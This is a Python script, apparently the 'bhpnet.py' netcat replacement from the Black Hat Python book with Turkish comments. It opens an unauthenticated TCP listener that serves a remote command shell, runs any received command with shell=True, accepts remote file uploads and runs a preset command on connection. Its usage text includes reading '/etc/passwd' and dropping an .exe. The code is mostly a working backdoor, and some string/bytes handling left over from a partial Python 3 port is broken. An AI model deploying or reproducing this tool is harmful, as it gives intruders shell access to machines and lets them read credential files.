import sys
import socket
import getopt
import threading
import subprocess

# bazı global değişkenlerin tanımları
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


# bir komut çalıştırır ve çıktıyı döndürür
def run_command(cmd):
    # yeni satırı kırp
    cmd = cmd.rstrip()

    # komutu çalıştır ve çıktıyı geri al
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT,
                                         shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    # çıktıyı client'a geri gönder
    return output


# gelen istemci bağlantılarını yönet
def client_handler(client_socket):
    global upload
    global execute
    global command

    # upload kontrolü
    if len(upload_destination):

        # tüm bytle'ları oku ve hedefe yaz
        file_buffer = ""

        # hepsi bitene kadar verileri okumaya devam edin
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # şimdi bu bytle'ları alıp yazmaya çalışıyoruz
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer.encode('utf-8'))
            file_descriptor.close()

            # dosyayı yazdığımızı bilgilendir
            client_socket.send(
                "Successfully saved file to %s\r\n" % upload_destination)
        except OSError:
            client_socket.send(
                "Failed to save file to %s\r\n" % upload_destination)

    # komut yürütmeyi kontrol et
    if len(execute):
        # komutu çalıştır
        output = run_command(execute)

        client_socket.send(output)

    # şimdi bir shell komutu istendiyse başka bir döngüye geçiyoruz
    if command:

        while True:
            # basit bir prompt göster
            client_socket.send("<BHP:#> ".encode('utf-8'))

            # şimdi geri bildirim görene kadar alıyoruz (anahtarı girin)
            cmd_buffer = b''
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # geçerli bir komutumuz var, bu yüzden yürüt ve sonuçları geri gönder
            response = run_command(cmd_buffer.decode())

            # yanıtı geri gönder
            client_socket.send(response)


# bu kısım, gelen bağlantılar içindir
def server_loop():
    global target
    global port

    # herhangi bir hedef tanımlanmamışsa tüm arayüzleri dinleriz
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # yeni client'larla ilgilenmek için bir thread döndürün
        client_thread = threading.Thread(target=client_handler,
                                         args=(client_socket,))
        client_thread.start()


# dinlemezsek biz client'ız... öyle olsun.
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # hedef sunucumuza bağlanın
        client.connect((target, port))

        # stdin'den input tespit edersek onu gönder
        # değilse, kullanıcının bazılarını içeri sokmasını bekleyeceğiz
        if len(buffer):
            client.send(buffer.encode('utf-8'))

        while True:
            # verilerin geri gelmesini bekleyin
            recv_len = 1
            response = b''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response.decode('utf-8'), end=' ')

            # daha fazla giriş için bekleyin
            buffer = input("")
            buffer += "\n"

            # gönder gitsin
            client.send(buffer.encode('utf-8'))

    except socket.error as exc:
        # sadece genel hataları yakalayın - bunu güçlendirmek için çalışıp öğrenebilirsiniz
        print("[*] Exception! Exiting.")
        print(f"[*] Caught exception socket.error: {exc}")

        # bağlantıyı sonlandır
        client.close()


def usage():
    print("Netcat Replacement")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print(
        "-l --listen                - listen on [host]:[port] for incoming "
        "connections")
    print(
        "-e --execute=file_to_run   - execute the given file upon receiving "
        "a connection")
    print("-c --command               - initialize a command shell")
    print(
        "-u --upload=destination    - upon receiving connection upload a file "
        "and write to [destination]")
    print()
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # komut satırı seçeneklerini oku
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target",
                                    "port", "command", "upload"])
        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
            elif o in ("-l", "--listen"):
                listen = True
            elif o in ("-e", "--execute"):
                execute = a
            elif o in ("-c", "--commandshell"):
                command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                target = a
            elif o in ("-p", "--port"):
                port = int(a)
            else:
                assert False, "Unhandled Option"

    except getopt.GetoptError as err:
        print(str(err))
        usage()

    # dinleyecek miyiz yoksa sadece STDIN'den veri mi göndereceğiz?
    if not listen and len(target) and port > 0:
        # buffer'ı komut satırından okunmasını bu engelleyecektir,
        # bu nedenle stdin'e input göndermiyorsa CTRL-D yapın
        buffer = sys.stdin.read()

        # veri gönder
        client_sender(buffer)

    # yukarıdaki komut satırı seçeneklerimize bağlı olarak dinleyeceğiz ve
    # potansiyel olarak bir şeyler yükleyeceğiz,
    # komutları yürüteceğiz ve geriye bir shell bırakacağız
    if listen:
        server_loop()


main()
